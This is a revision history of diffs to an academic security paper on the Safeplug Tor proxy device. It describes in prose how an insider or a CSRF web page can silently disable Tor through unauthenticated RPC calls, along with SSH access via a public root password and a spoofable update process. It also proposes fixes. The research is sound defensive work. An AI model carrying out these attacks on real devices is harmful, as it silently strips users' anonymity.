+While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ widget in a different tab.
+When we clicked on the Google+ widget, it remember who we are; so we can confirm that we still have first-party cookies.
 We experienced the same situation with Facebook and its corresponding ``like'' button.
+This was confirmed by using FourthParty, a plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data.
 
@@
 It requires a trip to the browser settings to clear cookies (or not have them set in the first place).
-We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}.
+We used FourthParty to analyze the client's use of the Safeplug \cite{fourthparty}.
 When collecting data on the existence of third-party cookies, we analyzed two separate browsing sessions; they were both new sessions with no cookies.
@@
 Since the RPC server does not perform any kind of validation or authentication on the settings strings, it would be easy for anyone inside the local network to send a command and change the settings, for example to disable Tor or adblocking.
-All the attacker would need to know is the IP of the device.
-It does not even require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
+All the attacker would need to know is the IP address of the device.
+It does not require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
 Figure \ref{disable} shows an example of this attack.
@@
 The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
-It is easy to imagine any malicious party, not just one with the resources of a government, (although governments might be some of the most interested parties in attacking a Tor proxy) compromising the gateway and using that access to make a disabling RPC call into the Safeplug.
+It is easy to imagine any malicious party, not just one with the resources of a government (although governments might be some of the most interested parties in attacking a Tor proxy), compromising the gateway and using that access to make a disabling RPC call into the Safeplug.
 This would occur silently from the perspective of a client unless they happen to check the Settings page for the Safeplug.
@@
 
-The largest observed time to send requests to the 192.168.0.0/24 space was approximately 400 milliseconds; the entire attack costs approximately 800 milliseconds for sending request to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.
+The largest observed time to send requests to the 192.168.0.0/24 space was approximately 400 milliseconds; the entire attack costs approximately 800 milliseconds for sending requests to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.
 In the case of a private network in the range of 172.16.0.0/16, the attack took less than ~12 minutes (this generates script timeout warnings in most major browsers, which affects the timing of this attack).
@@
 The final private network space is 10.0.0.0/8 which is too large for an exhaustive search, but some simple optimization might make it feasible as well.
-For example, using a GET request to get and parse the Safeplug settings page would allow the script to positively identify the safeplug and stop the search.
+For example, using a GET request to get and parse the Safeplug settings page would allow the script to positively identify the Safeplug and stop the search.
 However, the 192.168.0.0/24 and 192.168.1.0/24 ranges are much more common in home networks; because Safeplug is geared towards home network use, in most cases the script will take less than a second, a trivial amount of time for the attacker to spend.
@@
 
-Obviously having a publically available root password means that SSH can be done effectively without authentication.
-We tried the SSH procedure twice, once before the internet connection and activation, and once afterwards.
+Having a publically available root password means that SSH can be done effectively without authentication.
+We tried the SSH procedure twice, once before the Internet connection and activation, and once afterwards.
 Before the activation and update procedure, SSH was not available.
@@
 A more dangerous class of vulnerabilities comes from the fact that the update process happens over insecure TCP rather than any kind of encrypted process.
-During our network analysis of the activation process, we discovered that the update script is downloaded via TCP from an IP address provided by the pogoplug servers.
+During our network analysis of the activation process, we discovered that the update script is downloaded via TCP from an IP address provided by the Pogoplug servers.
 This update script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is suitable verification of the update script itself.
 An adversary could use DNS spoofing or compromise the Pogoplug server in order to force users to download a malicious update script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
-Since the most efficient way to check this would be to verify the contents of the Safeplug box itself by SSHing in, and SSHing explicitly breaks the warranty, it is clear that any kind of mitigation to this attack would be beyond an average user.
+Since the most efficient way to check this would be to verify the contents of the Safeplug box itself by SSHing in, it is clear that any kind of mitigation to this attack would be beyond an average user.
 Because the activation occurs over TCP rather than anything more secure, an adversary who can spoof DNS replies to the user has a paved gateway into the Safeplug box.
-This turns a device that does not live up to expectations but is otherwise harmless into something that actively harms security on the network.
+This turns a device that does not live up to expectations, but is otherwise harmless, into something that actively harms security on the network.
 
@@
 
-{\bf Fingerprinting.}  Website fingerprinting attacks as well as remote physical device fingerprinting attacks have shown they can identify users, even when specific defenses have been used in order to prevent these attacks.
+{\bf Fingerprinting.}  Website fingerprinting attacks as well as remote physical device fingerprinting attacks have shown they can identify users, even when specific defenses have been used in order to prevent them.
 Previous research has shown that web page fingerprinting attacks are possible~\cite{dyer, herrmann, panchenko}.
@@
 \subsection{Engineering Fixes}
-The most critical engineering fix is authentication in the POST calls to prevent the cross-site request forgery attack.
-A typical example is a cookie and a hidden form field set in the Settings page the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.
-Although someone doing a cross-site request forgery attack such as the one described above could get the cookie sent, because of the same-origin policy, the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
+The most critical engineering fix is authentication in the POST calls to prevent the CSRF attack.
+A typical example is a cookie and a hidden form field set in the Settings page of the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.
+Although someone doing a CSRF attack such as the one described above could get the cookie sent, because of the same-origin policy, the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
 
@@
 One type of client that deserves special attention is a non-Android mobile phone user.
-Although the Tor Project publishes an Android app called Orbot on the Android Market \cite{orbot} which is supported for Android versions 2.3 and later \cite{amorbot}, there are no official Tor apps for iPhones or other non-Android devices.
+Although the Tor Project publishes an Android app called Orbot on the Android Market, which is supported for Android versions 2.3 and later, there are no official Tor apps for iPhones or other non-Android devices~\cite{orbot,amorbot}.
 Safeplug provides proxy functionality and instructions for Safari on the iPhone; however, this would only work while the user is on that wifi network that the Safeplug routes through.
@@
 Despite all the structural problems, is there a market for a Torifying piece of hardware?
-Given the security pitfalls in comparison to a piece of software such as the Tor browser bundle, there seems to be no reason for a user that can run the Tor browser bundle to purchase the Safeplug or any other device.
+Given the security pitfalls in comparison to a piece of software such as the Tor Browser Bundle, there seems to be no reason for a user that can run the Tor Browser Bundle to purchase the Safeplug or any other device.
 For mobile phones, the proxy problems with mobility contribute to an already high usability cost.
@@
 For them, is the benefit of some anonymity via a Safeplug-like device worthwhile?
-Since the data sent by these devices to the service provider likely contains lots of identifying information, the use of Tor probably only protects the user's location at the expense of connection time and load on the Tor network.
+Since the data sent by these devices to the service provider likely contains identifying information, the use of Tor probably only protects the user's location at the expense of connection time and load on the Tor network.
 Since proxy configuration on such devices is likely to be difficult and the amount of information hidden is unlikely to be worth the effort, a Torifying box that functions as a proxy has questionable use in this space as well.
@@
 Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is not the correct method for security and anonymity online.
-It is critical for Safeplug to correct their engineering errors, particularly the vulnerability to silent disabling of Tor in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.
+It is critical for Safeplug to correct their engineering errors, particularly the vulnerability to silently disable Tor, in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.
 

### 2014-02-25 w2sp/report.tex
Some fixes at the end

@@
 These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
+The adblock functionality on the Safeplug reduced but did not eliminate these third-party cookies.
+
+Although Safeplug has a warning about clearing cookies on their FAQ page, it only mentions clearing cookies after a browser session.
+Of greater concern would be tracking a user during their browser session from website to website; preventing this requires knowledge and constant viligance from the user, or a browser that does not accept third-party cookies, such as the one provided in the Tor Browser Bundle.
+
+\subsection{Browser Fingerprinting}
+We used Panopticlick~\cite{panopticlick} to examine the fingerprint of a freshly installed Firefox browser running through the Safeplug proxy.
+Panopticlick found the browser to be unique.
+Fingerprinting is another way in which websites could correlate and de-anonymize user traffic without knowing the IP address.
 
@@
 When taking these measurements, we loaded the page, but did not scroll; in many cases more objects are loaded when scrolling down a page.
-The differences between web pages can most likely be attributed to the amount of ads on the web page.
+The differences between web pages can most likely be attributed to the amount of advertisements and content running in plugins (such as video) on the web page.
 
@@
 \subsection{Insider Attack}
-Since the RPC server does not perform any kind of validation or authentication on the settings strings, it would be easy for anyone inside the local network to send a command and change the settings, for example to disable Tor or adblocking.
+Since the Safeplug has no validation or authentication on the settings page or these RPC calls, an malicious party inside the network could easily modify the settings.
+Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal internet users, anyone can perform this attack.
+Unlike many home routers, there is no username/password combination necessary to access this page.
+
+A more technically advanced user could send the call directly to the RPC server.
 All the attacker would need to know is the IP address of the device.
 It does not require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
-Figure \ref{disable} shows an example of this attack.
+Figure \ref{disable} shows an example of the PRC version of this attack.
 
-This attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
+Since the RPC version of the attack just involves basic internet tools (the ability to send a POST request), the attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
 The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
@@
 \subsection{CSRF Attack}
-An external website can also perform this attack by returning a correctly formatted POST string.
+An external website can also perform this attack by returning a correctly formatted POST string via an internal user's browser.
 This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.
@@
 \label{sec:SSH}
-    Safeplug runs an RPC server that allows the enabling of SSH access via HTTP.
+    Another command available to the RPC server is enabling SSH to the device.
 SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
@@
 
+\bibitem{panopticlick} Electronic Fronteir Foundation. ``Panopticlick.'' \url{https://panoptlick.eff.org}
+
 \bibitem{feamster} Feamster, Nick, and Dingledine, Roger.  ``Location Diversity in Anonymity Networks.''  \emph{In ACM Workshop on Privacy in the Electronic Society (WPES)}, 2004.

### 2014-02-26 w2sp/report.tex
figures
changes from email
more edits, added legality paragraph about tor relays/exits

@@
 \usepackage[caption=false]{subfig}
+\usepackage[center]{caption}
 % subfigure.sty was written by Steven Douglas Cochran. This package makes it
@@
 Furthermore, an engineering vulnerability in the Safeplug's settings commands would allow an adversary internal or external to a user's home network to silently disable Tor or modify other Safeplug settings, which completely overrules the security claims of the device.
-Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods, the Tor Browser Bundle.
+Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods: the Tor Browser Bundle.
 \end{abstract}
@@
 
-The cloud storage company Pogoplug noticed the demand for online anonymity and in November of 2013 they released the Safeplug.
+The cloud storage company Pogoplug noticed the demand for online anonymity and in December of 2013 they released the Safeplug.
 This device is a small box that plugs into a user's home router and by routing all traffic through Tor, it claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online~\cite{pogo}.
@@
 \centering
-\includegraphics[width=.6\textwidth]{safeplug_flowchart}
+\includegraphics[width=.4\textwidth]{safeplug_flowchart}
 \caption{Flowchart demonstrating the actual functionality of the Safeplug as an HTTP proxy between a device's browser and the home network's router.}
@@
 It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
-Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the internet \cite{wired}.
+Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the Internet \cite{wired}.
 Pogoplug's marketing pitch centers around the protection of users' IP addresses by using Tor \cite{safeplug,bittech}.
@@
 A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
-The TOS conatins a link to a page that woudl supposedly comply with this requirement  \url{http://pogoplug.com/home-en-developers-open-source.html}\cite{safeplug} but the link is dead and instead the reader sees a 404 error.
-This dead link was noted by some members of the Tor-talk mailing list in November 2013\cite{tormailinglist} and has not been fixed as of Feburary 2014.
+The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead and instead the reader sees a 404 error \cite{safeplug}.
+This dead link was noted by some members of the Tor-talk mailing list in November 2013 and has not been fixed as of Feburary 2014 \cite{tormailinglist}.
 Pogoplug's open source page does exist at \url{https://pogoplug.com/opensource} and includes several pieces of software for the Safeplug: bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
@@
 The final area of interest was software updates on the device which will be ``automatically delivered'' to the user, but it is unclear whether there will be any notification~\cite{safeplug}.
-Although a prompt updating mechanism is an important security feature for users who trust Pogoplug and their update servers (in fact the activation process seems designed for keeping the software up to date and it is concerning that this does not seem to uniformly occur as discussed in Section~\ref{versions}), other users might want to disable this functionality for fear of a malicious use of Pogoplug's servers or a spoofing attack (see Section \ref{dnsspoof} for more details of this attack).
+Although a prompt updating mechanism is an important security feature for users who trust Pogoplug and their update servers (in fact the activation process seems designed for keeping the software up to date and it is concerning that this does not seem to uniformly occur as discussed in Section~\ref{versions}), other users might want to disable this functionality for fear of a malicious use of Pogoplug's servers or a spoofing attack (see Section \ref{dnsspoof}).
 This is one of the many reasons why users who truly need security and anonymity should opt for the Tor Browser Bundle rather than adding the Safeplug to their network.
@@
 
-The link provided is to an advertisement-filled and not particularly reputable looking website with no clear navigation to get to the necessary instructions.
+The link provided is to an advertisement-filled and not particularly reputable-looking website with no clear navigation to get to the necessary instructions.
 
@@
 This could be a problem if users simply decide not to do anything with that setting (i.e.
-don't change the setting to use Safeplug as a relay node).
+don't change the setting to use the Safeplug as a relay node).
 In this case, there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
@@
 This increases the chances that users will run their Safeplug as a relay node.
+
+Another consequence of misunderstanding the use of the Safeplug as a relay node, or more specifically, as an exit node is the possible legal repercussions.
+As an exit relay, all traffic that exits the node can be traced back to the Safeplug's IP address; it is likely that some of this traffic contains illegal information or is part of illegal activities.
+The Tor Project recommends not running an exit relay from a user's home: ``If law enforcement becomes interested in traffic from your exit relay, it's possible that officers will seize your computer.
+For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay, especially without providing the user with any information.
 
@@
 The Marvell controller is from 2008 and runs ARM~\cite{marvellhw}.
-This is the same controller as version 4 of Pogoplug's cloud storage device - and takedowns of that device available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
-Also of note: the Safeplug branding is a sticker on the front of the device, whereas the Pogoplug branding is etched into the plastic on top of the device, which indicates that the Safeplug uses the same hardware as Pogoplug's existing devices, and derives its differing functionality from different software.
+This is the same controller as version 4 of Pogoplug's cloud storage device; takedowns of that device that are available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
+It is also interesting to note that the Safeplug branding is a sticker on the front of the device, whereas the Pogoplug branding is etched into the plastic on top of the device, which indicates that the Safeplug uses the same hardware as Pogoplug's existing devices, and derives its differing functionality from different software.
 
@@
 Unsurprising for its age, there are a number of network vulnerabilities for this version of the kernel - most of which produce denial of service attacks if an adversary sends a particularly formed packet \cite{kernelcve}.
-This is the same version of Linux that runs on Version 4 of PogoPlug's Mobile platform \cite{archforum}.
+This is the same version of Linux that runs on Version 4 of Pogoplug's Mobile platform \cite{archforum}.
 
 The software installed by the activation process on the Safeplug is in \verb!/opt/xce!
-and includes lighttpd, privoxy, and tor.
+and includes Lighttpd, Privoxy, and Tor.
 Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
 while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
-The version of lighttpd on the box is only one version away from being up to date, 1.4.33 which was released on 27 September 2013.
-The current version of lighttpd, which has a number of security fixes, was released on 20 January 2014, after the Safeplug was purchased.
+The version of Lighttpd on the box is only one version away from being up to date, 1.4.33 which was released on 27 September 2013.
+The current version of Lighttpd, which has a number of security fixes, was released on 20 January 2014, after the Safeplug was purchased.
 However, checking for an update from the Safeplug does not lead to any updated software installation.
@@
 
+[TODO: Safeplug Call Graph]
+
 \subsection{Networking}
-The lighttpd, Privoxy, and Dropbear software give some indication of the networking services on the device.
+The Lighttpd, Privoxy, and Dropbear software give some indication of the networking services on the device.
 We used \texttt{nmap} to scan the ports.
-Before the activation of the Safeplug, only ports 80 and port 3333 are open.
-After the activation, without the use of Tor turned on, ports 22 for SSH, port 80 for settings access and port 8080 for http-proxy are open.
+Before the activation of the Safeplug, only ports 80 and 3333 are open.
+After the activation, without the use of Tor turned on, port 22 for SSH, port 80 for settings access and port 8080 for http-proxy are open.
 When Tor is turned on as a relay, port 9001 tor-orport is opened as well.
@@
 and \verb!sp_torexceptions!.
-The first contains all of the configuration details: whether to use Tor, whether to adblock, and whether to be a relay or an exit relay.
-The version file is used during the check for updates, and the exceptions file is used by the privoxy configuation to control the whitelist of sites not to connect to via Tor.
+The first contains all of the configuration details: whether to use Tor, whether to ad-block, and whether to be a relay or an exit relay.
+The version file is used during the check for updates, and the exceptions file is used by the Privoxy configuation to control the whitelist of sites not to connect to via Tor.
 
 These configuration files are read by the scripts in \verb!/opt/xce/etc/init.d!
-which enable lighttpd, privoxy, and tor.
-As expected, Privoxy looks at the Tor, adblock and exceptions configurations, and Tor reads the \verb!sp.conf!
-file to set which Tor configuration file (regular, relay or exit relay) to use.
+which enable Lighttpd, Privoxy, and Tor.
+As expected, Privoxy looks at the Tor, ad-block and exceptions configurations, and Tor reads the \verb!sp.conf!
+file to set which Tor configuration file (regular, relay, or exit relay) to use.
 
@@
 This page is shown in Figure~\ref{fig:settings}.
-This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off (and if on, an additional option appeared to allow the device to be an exit node.
+This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off (and if on, an additional option appeared to allow the device to be an exit node).
 
@@
 A user would probably decide not to use Safeplug if they could not read their web pages (if they were not in their native language), or if they could not log into their accounts (some web sites will lock a user out if they try to log in from multiple countries in a short time period).
-While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, they may just get frustrated and stop using Safeplug altogether.
+While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, they may get frustrated and stop using Safeplug altogether.
 We were also prompted with a request to ``Enter the name of the city where you usually sign in'' when we tried to log into our Google account, indicating that Google noticed we were trying to login from significantly ``unusual'' location.
@@
 These included cookies from: abmr.net, bizographics.com, krxd.net, and bluekai.com among many others.
-The adblock functionality on the Safeplug reduced but did not eliminate these third-party cookies.
+The ad-block functionality on the Safeplug reduced, but did not eliminate these third-party cookies.
 
 Although Safeplug has a warning about clearing cookies on their FAQ page, it only mentions clearing cookies after a browser session.
-Of greater concern would be tracking a user during their browser session from website to website; preventing this requires knowledge and constant viligance from the user, or a browser that does not accept third-party cookies, such as the one provided in the Tor Browser Bundle.
+Of greater concern would be tracking a user during their browser session from website to website; preventing this requires knowledge and constant vigilance from the user, or a browser that does not accept third-party cookies, such as the one provided in the Tor Browser Bundle.
 
 \subsection{Browser Fingerprinting}
-We used Panopticlick~\cite{panopticlick} to examine the fingerprint of a freshly installed Firefox browser running through the Safeplug proxy.
+We used Panopticlick to examine the fingerprint of a freshly installed Firefox browser running through the Safeplug proxy~\cite{panopticlick}.
 Panopticlick found the browser to be unique.
@@
 and it contains various options.
-Particularly, functional calls to this script include enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.
+Particularly, functional calls to this script include the ability to enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.
 None of them require any arguments in the POST string.
@@
 \subsection{Insider Attack}
-Since the Safeplug has no validation or authentication on the settings page or these RPC calls, an malicious party inside the network could easily modify the settings.
-Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal internet users, anyone can perform this attack.
+Since the Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the network could easily modify the settings.
+Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal Internet users, anyone can perform this attack.
 Unlike many home routers, there is no username/password combination necessary to access this page.
@@
 
-Since the RPC version of the attack just involves basic internet tools (the ability to send a POST request), the attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
+Since the RPC version of the attack just involves basic Internet tools (the ability to send a POST request), the attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
 The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
 It is easy to imagine any malicious party, not just one with the resources of a government (although governments might be some of the most interested parties in attacking a Tor proxy), compromising the gateway and using that access to make a disabling RPC call into the Safeplug.
-This would occur silently from the perspective of a client unless they happen to check the Settings page for the Safeplug.
+This would occur silently from the perspective of a client unless they happen to check the settings page for the Safeplug.
 Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.
@@
 The largest observed time to send requests to the 192.168.0.0/24 space was approximately 400 milliseconds; the entire attack costs approximately 800 milliseconds for sending requests to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.
-In the case of a private network in the range of 172.16.0.0/16, the attack took less than ~12 minutes (this generates script timeout warnings in most major browsers, which affects the timing of this attack).
+In the case of a private network in the range of 172.16.0.0/16, the attack took less than 12 minutes (this generates script timeout warnings in most major browsers, which affects the timing of this attack).
 This means that it would take a few hours to send requests to the full 172.16.0.0/12 range, which is commonly used in business networks.
@@
 software on the box could not accept this RPC call.
-However, once the box was updated and had lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.
+However, once the box was updated and had Lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.
 
@@
 The most critical engineering fix is authentication in the POST calls to prevent the CSRF attack.
-A typical example is a cookie and a hidden form field set in the Settings page of the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.
+A typical example is a cookie and a hidden form field set in the settings page of the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.
 Although someone doing a CSRF attack such as the one described above could get the cookie sent, because of the same-origin policy, the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.
@@
 For mobile phones, the proxy problems with mobility contribute to an already high usability cost.
-However, there are an emerging class of ``smart home'' devices which may connect to the internet.
+However, there are an emerging class of ``smart home'' devices which may connect to the Internet.
 It is possible that some of these devices can be configured to use an HTTP proxy or some other middle box to Torify their traffic to an external service provider.
@@
 
+\bibitem{law} The Legal FAQ for Tor Relay Operators. \url{https://www.torproject.org/eff/tor-legal-faq}.
+
 \bibitem{lighttpd} Lighttpd. \url{http://www.lighttpd.net}

### 2014-02-26 w2sp/report.tex
Fix a silly typo, and also IEEE caption hack
added call graph
finished write up of call graph

@@
 \documentclass[conference]{IEEEtran}
+\makeatletter
+\long\def\@makecaption#1#2{\ifx\@captype\@IEEEtablestring%
+\footnotesize\begin{center}{\normalfont\footnotesize #1}\\
+{\normalfont\footnotesize\scshape #2}\end{center}%
+\@IEEEtablecaptionsepspace
+\else
+\@IEEEfigurecaptionsepspace
+\setbox\@tempboxa\hbox{\normalfont\footnotesize {#1.}~~ #2}%
+\ifdim \wd\@tempboxa >\hsize%
+\setbox\@tempboxa\hbox{\normalfont\footnotesize {#1.}~~ }%
+\parbox[t]{\hsize}{\normalfont\footnotesize \noindent\unhbox\@tempboxa#2}%
+\else
+\hbox to\hsize{\normalfont\footnotesize\hfil\box\@tempboxa\hfil}\fi\fi}
+\makeatother
 % Add the compsoc option for Computer Society conferences.
@@
 \usepackage[caption=false]{subfig}
-\usepackage[center]{caption}
+%\usepackage[center]{caption}
 % subfigure.sty was written by Steven Douglas Cochran. This package makes it
@@
 
-[TODO: Safeplug Call Graph]
+Figure \ref{fig:callgraph} shows the call graph for the modifying the settings page.
+When a user modifies the settings page, Javascript on the settings page generates a POST request to xspctrl, which is running via CGI in Lighttpd.
+The CGI handler copies a number of environment variables and then forks and runs the xspctrl as execve (in the constructed environment).
+Xspctrl is a shell script which uses the end of the path to discover the correct method to run and executes any of the necessary binary files with specified arguments (go\_update, go\_upgrade, go\_sshd, or go\_updateexceptions) to complete its request before returning a response.
+
+\begin{figure*}
+\centering
+\includegraphics[width=.55\textwidth]{callgraph}
+\caption{The call graph for modifying the Safeplug settings page.}
+\label{fig:callgraph}
+\end{figure*}
 
@@
 \begin{figure}[htb]
-  \begin{center}
+  \centering
   \includegraphics[width=.4\textwidth]{settings_with_exit}
@@
   \label{fig:settings}
-  \end{center}
 \end{figure}
@@
 It does not require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
-Figure \ref{disable} shows an example of the PRC version of this attack.
+Figure \ref{disable} shows an example of the RPC version of this attack.
 

### 2014-02-28 w2sp/report.tex
made some suggested changes and added TODO file

@@
 
+\pagestyle{plain}
+
 \begin{document}
@@
 As the Internet grows and the amount of user information that is collected and/or provided online increases, users will continue to be more vulnerable.
-According to this study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address~\cite{pew}.
+According to one study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address~\cite{pew}.
 While this study shows that a large percentage of users are taking measures to reduce their visibility online, 59\% reported that they don't believe it is possible to become completely anonymous online~\cite{pew}.
@@
 \begin{itemize}
-\item The Safeplug functions as a HTTP proxy inside the browser, which then uses Tor on outgoing traffic (see Figure \ref{fig:flow}).
+\item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor on outgoing traffic (see Figure \ref{fig:flow}).
 \item The presence of both first- and third-party tracking cookies, de-anonymizing users across websites despite the presence of Tor.
@@
 \centering
-\includegraphics[width=.75\textwidth]{instructions}
+\includegraphics[width=.75\textwidth]{instructions2}
 \caption{Setup instructions (and the only documentation) that came in the box with the Safeplug.
@@
 {\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers a box for home network file sharing without needing to use a third-party storage provider.
-Based on our examination of the box discussed below, we suspect that the Pogoplug box was relabelled as Safeplug and simply uses different software to achieve its newly branded purpose.
+Based on our examination of the box discussed below, we suspect that the Pogoplug hardware was relabelled as Safeplug and simply uses different software to achieve its newly branded purpose.
 
@@
 First, the TOS are not presented to the user in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
-Although use of the Safeplug device constitutes acceptance of the TOS, most users are not likely to read the TOS even once.
+Although use of the Safeplug device purportedly constitutes acceptance of the TOS, most users are not likely to read the TOS even once.
 However, Pogoplug suggests that users regularly review the TOS because they can update or change them at any time; this is standard language in TOS but not a good combination with them not being presented to the user.
@@
 While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ widget in a different tab.
-When we clicked on the Google+ widget, it remember who we are; so we can confirm that we still have first-party cookies.
+When we clicked on the Google+ widget, it remember who we are; so we can confirm that a cookie associated with the login was sent to the second Google+ page.
 We experienced the same situation with Facebook and its corresponding ``like'' button.
@@
 \section{Conclusion}
-Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is not the correct method for security and anonymity online.
+Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is problematic as a method for security and anonymity online.
 It is critical for Safeplug to correct their engineering errors, particularly the vulnerability to silently disable Tor, in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.

### 2014-02-28 w2sp/report.tex
more edits

@@
 \item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor on outgoing traffic (see Figure \ref{fig:flow}).
-\item The presence of both first- and third-party tracking cookies, de-anonymizing users across websites despite the presence of Tor.
-\item A Cross-Site Request Forgery (CSRF) vulnerability that allows an outside attacker to modify the Safeplug settings (i.e., turning Tor on/off, turning ad-blocking on/off, turning the Tor relay setting on/off, adding/removing whitelisted sites from Tor).
-\item A vulnerability that allows an attacker within the network to modify the Safeplug settings without notifying any other devices on the network.
-\item A higher latency than that of the Tor Browser Bundle.
+\item The browser collects both first- and third-party tracking cookies, de-anonymizing users across websites despite the presence of Tor.
+\item A Safeplug user is vulnerable to a Cross-Site Request Forgery (CSRF) attack that allows an outside attacker to modify the Safeplug settings (i.e., turning Tor on/off, turning ad-blocking on/off, turning the Tor relay setting on/off, adding/removing whitelisted sites from Tor).
+\item A malicious user within the network can modify the Safeplug settings without notifying any other devices on the network.
+\item The Safeplug has a higher web request latency than that of the Tor Browser Bundle.
 \end{itemize}
@@
 Given the different location and installation methods, it seems likely that this was from the older Pogoplug device and is not designed to be updated in the same manner as the rest of the Safeplug software.
+However, the SSH server is active and listening on port 22.
 
@@
 \begin{itemize}
-\item Plain Firefox
-\item Firefox, no Tor, no ad-blocking
+\item Plain Firefox (traffic not running through the Safeplug device)
+\item Firefox, no Tor, no ad-blocking (traffic running through the Safeplug device)
 \item Firefox, Tor, no ad-blocking
@@
 This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.
-Instead, the attacker (who could be any malicious actor with access to a web server) can just send a POST request to every IP in the common ranges of local addresses in home networks, 192.168.0.0/24 and 192.168.1.0/24.
+The CSRF attack requires a nonmalicious insider user to visit a web page controlled by the attacker; additionally, the attacker must target the POST to the IP address of the Safeplug, but the attacker can get the right address by an exhaustive search.
 We implemented this attack with less than 20 lines of Javascript code.
@@
 The most critical engineering fix is authentication in the POST calls to prevent the CSRF attack.
